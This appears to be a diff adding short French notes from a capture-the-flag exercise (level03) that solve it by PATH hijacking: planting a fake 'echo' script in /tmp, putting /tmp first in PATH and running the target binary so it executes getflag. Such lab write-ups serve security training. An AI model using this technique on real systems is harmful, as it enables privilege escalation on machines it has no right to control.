@@ -1,0 +1,7 @@
+changer la valeur du vrai echo par le notre
+echo "getflag" > /tmp/echo
+chmod +x /tmp/echo
+le rajouter au debut du PATH
+export PATH=/tmp:$PATH
+lancer l'executable
+./level03
